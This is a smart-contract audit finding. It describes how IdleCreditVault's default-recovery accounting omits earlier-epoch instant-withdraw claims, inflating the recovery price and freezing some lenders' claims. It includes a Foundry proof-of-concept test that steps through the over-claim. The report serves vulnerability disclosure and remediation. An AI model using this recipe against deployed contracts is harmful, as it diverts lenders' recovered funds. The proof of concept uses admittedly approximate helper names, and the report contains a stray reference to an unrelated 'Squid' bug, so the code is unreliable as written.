### Title
Unfunded instant-withdraw receipts from prior epochs are excluded from the default-recovery basis, inflating `defaultRecoveryPrice` and permanently freezing the excluded claims - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.defaultPendingClaimBasis()` reads only `instantWithdrawClaimsByEpoch[epochNumber]` — the claims bucket of the *current* epoch — when `pendingInstantWithdraws != 0`. `pendingInstantWithdraws` is an aggregate that can contain unfunded instant receipts requested in *earlier* epochs (receipts are keyed per request epoch in `instantWithdrawsRequestsByEpoch`). Like the Squid over-read, the code reads the wrong "index" (current-epoch slot) instead of the region actually backing the liability, so value belonging to one set of claimants is handed to another.

### Finding Description
- `requestInstantWithdraw` records receipts under the *request* epoch: `instantWithdrawsRequestsByEpoch[_user][currentEpoch]` and `instantWithdrawClaimsByEpoch[currentEpoch]` (IdleCreditVault.sol:367–374), while `pendingInstantWithdraws` is a global aggregate.
- Unfunded instant receipts survive an epoch roll: the existing test at `test/foundry/IdleCreditVault.t.sol:4505–4524` shows `pendingInstantWithdraws > 0` carrying into `_startEpochAndCheckPrices(2)`.
- On default, `defaultPendingClaimBasis()` (IdleCreditVault.sol:644–649) adds only `instantWithdrawClaimsByEpoch[epochNumber]` — i.e. only the *default* epoch's instant claims — even though `pendingInstantWithdraws` includes earlier-epoch unfunded claims.
- `finalizeDefaultRecovery` (IdleCreditVault.sol:679–692) divides the reserve by this under-counted `totalBasis`, producing an inflated `defaultRecoveryPrice`.
- Claims are also epoch-keyed: `_claimDefaultedInstantWithdrawRequest` only looks up `instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]` (IdleCreditVault.sol:843–844). An earlier-epoch claimant gets `claimBasis == 0`, falls through to `claimInstantWithdrawRequest`, and `_transferFundedClaim` reverts because the only strategy balance is the recovery reserve (`balance - reserve < amount`, IdleCreditVault.sol:899–906) — their claim is permanently frozen while their share was redistributed to other claimants via the inflated price.

Broken invariant: fair recovery distribution / one-receipt-one-payout. Existing guards (`_ensureDefaultRecoveryInitialized`, reserve isolation in `_transferFundedClaim`) do not stop it — they are what convert the victims' claims into a hard revert.

### Impact Explanation
An attacker holding a default-epoch instant receipt claims at an inflated `defaultRecoveryPrice`, receiving strictly more than pro-rata (direct theft of recovery proceeds / unclaimed yield belonging to the earlier-epoch claimants). The earlier-epoch claimants' recovery is permanently frozen: `claimInstantWithdrawRequest` always reverts post-finalization, and their share remains stranded inside `defaultRecoveryReserve` with no withdrawal path. Loss is quantified as `(trueBasis − countedBasis) × recoveredAmount / trueBasis` diverted to default-epoch claimants, plus 100% of the omitted claimants' entitlement frozen.

### Likelihood Explanation
Requires: an unfunded (or partially unfunded) instant-withdraw queue that spans an epoch boundary — reachable whenever the CDO's liquid funds cover only part of `pendingInstantWithdraws` at `getInstantWithdrawFunds`/`startEpoch` — followed by a borrower default and `finalizeDefault`. Both conditions occur in the ordinary instant-withdraw mode without privileged misbehavior; the attacker only needs to hold an instant receipt in the default epoch (a normal unprivileged lender action) and call `claimInstantWithdrawRequest` before others.

### Recommendation
Track an aggregate "unfunded instant claim basis" (or iterate/store the epochs that contribute to `pendingInstantWithdraws`) and use it in `defaultPendingClaimBasis` instead of `instantWithdrawClaimsByEpoch[epochNumber]` alone. Correspondingly, `_claimDefaultedInstantWithdrawRequest` must clear every unfunded epoch's `instantWithdrawsRequestsByEpoch[_user][*]` entry — not only `defaultRecoveryEpoch` — or keep a per-user unfunded basis counter so all defaulted receipts are haircut at `defaultRecoveryPrice` regardless of request epoch.

### Proof of Concept
Foundry (fork-style, extending `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testDefaultOmitsPriorEpochInstantClaims() external {
    address victim = makeAddr('victim-old-epoch-instant');
    address attacker = makeAddr('attacker-default-epoch-instant');
    uint256 amount = 10_000 * ONE_SCALE;

    // epoch 0: victim deposits and requests an instant withdraw that is only partially funded
    _depositWithUser(victim, amount, true);
    _depositWithUser(attacker, amount, true);
    _startEpochAndCheckPrices(0);
    uint256 victimTranche = IERC20Detailed(AAtranche).balanceOf(victim);
    vm.prank(victim);
    uint256 victimReceipt = cdoEpoch.requestWithdraw(victimTranche / 2, address(AAtranche)); // instant path
    // fund only part of the instant queue so pendingInstantWithdraws stays > 0
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds(); // partial funding as in existing test

    // epoch rolls; victim's receipt is keyed to epoch 0 and remains unfunded
    _startEpochAndCheckPrices(1);
    IdleCreditVault cv = IdleCreditVault(address(strategy));
    assertGt(cv.pendingInstantWithdraws(), 0);
    assertEq(cv.instantWithdrawClaimsByEpoch(cv.epochNumber()), 0); // current-epoch bucket empty

    // attacker requests an instant withdraw in the new epoch
    uint256 attackerTranche = IERC20Detailed(AAtranche).balanceOf(attacker);
    vm.prank(attacker);
    uint256 attackerReceipt = cdoEpoch.requestWithdraw(attackerTranche / 2, address(AAtranche));

    // borrower defaults; recovery is finalized
    _stopEpochAndCheckPrices(1, initialProvidedApr, 0);
    _checkDefault();
    uint256 basis = cv.defaultPendingClaimBasis();
    // basis omits victim's epoch-0 claim even though pendingInstantWithdraws includes it
    assertLt(basis, cv.pendingWithdraws() + cv.instantWithdrawClaimsByEpoch(0) + attackerReceipt);
    uint256 recovered = (cdoEpoch.getContractValue() + basis) * 5e17 / ONE_TRANCHE;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    // attacker claims at an inflated defaultRecoveryPrice -> receives more than fair share
    uint256 pre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 attackerPayout = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - pre;
    assertGt(attackerPayout, attackerReceipt * 5e17 / ONE_TRANCHE);

    // victim's earlier-epoch instant claim is permanently frozen: falls through to
    // claimInstantWithdrawRequest -> _transferFundedClaim reverts on reserve guard
    vm.prank(victim);
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    cdoEpoch.claimInstantWithdrawRequest();
}
```

Note: exact helper names (`_startEpochAndCheckPrices`, `_checkDefault`, `requestWithdraw` signature) follow the existing test file conventions; the key assertions — `defaultPendingClaimBasis` omitting the epoch-0 bucket and the victim's claim reverting — follow directly from `defaultPendingClaimBasis` (IdleCreditVault.sol:644–649) and `_claimDefaultedInstantWithdrawRequest` (IdleCreditVault.sol:842–856).
